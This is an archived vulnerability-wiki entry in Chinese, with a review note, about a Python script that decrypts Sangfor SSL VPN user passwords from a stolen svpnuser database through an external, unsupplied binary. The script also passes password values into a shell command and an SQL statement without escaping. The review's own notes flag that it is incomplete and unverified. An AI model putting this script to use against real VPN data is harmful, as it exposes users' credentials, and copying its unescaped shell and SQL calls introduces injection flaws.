---
source: "历史归档批(无原始出处标注)"
id: "vw-ee2d8f36850b4374a7fadfeb"
entity_id: "ve-ee2d8f36850b4374a7fadfeb"
schema_version: "1"
title: "深信服 SSL VPN 解密"
product: "Sangfor SSL VPN svpnuser数据库"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "本地DB及./a.out解密二进制"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E8%A7%A3%E5%AF%86.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# 深信服 SSL VPN 解密

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor SSL VPN svpnuser数据库
- 本文讨论：非独立漏洞，需预先取得数据库的解密辅助
- 版本、权限与配置前提：本地DB及./a.out解密二进制
- 资料类型：离线数据库处理辅助脚本；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 关键a.out无源码/文件或算法说明，无法完成解密
- out_file/pwd_list从未写出，称outfile实际只改数据库副本；无产品版本/来源
- 密码插入shell/SQL未转义，脚本处理不可信内容自身有风险
- 已落实的文本修订：补齐文章标题。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 解密算法、格式版本及所需二进制来源待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


```python
import sqlite3
import sys
import os
import shutil

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("sql3 decode for sunfor")
        print("decode.py sql3db outfile_name")
        exit(0)

    db_path = sys.argv[1]
    out_path = sys.argv[2]
    new_db = out_path + ".sql3"
    out_file = out_path + '.txt'

    shutil.copyfile(db_path, new_db)

    conn = sqlite3.connect(db_path)
    conn2 = sqlite3.connect(new_db)
    print("Open database success")

    c = conn.cursor()
    cursor = c.execute("SELECT id, name, passwd from svpnuser;")

    c2 = conn2.cursor()
    print("select success start decode")
    pwd_list = ''
    for row in cursor:
        user_id = row[0]
        name = row[1]
        passwd = row[2]
        if not passwd:
            continue
        fp = os.popen("./a.out %s" % passwd, 'r')
        try:
            passwd = fp.read()
            fp.close()
        except Exception as e:
            print(e)
        pwd_list += name + ":" + passwd + '\n'
        c2.execute('UPDATE svpnuser SET passwd = "%s" where id = %d;'%(passwd, user_id))


    conn2.commit()


    print("decode success")
```

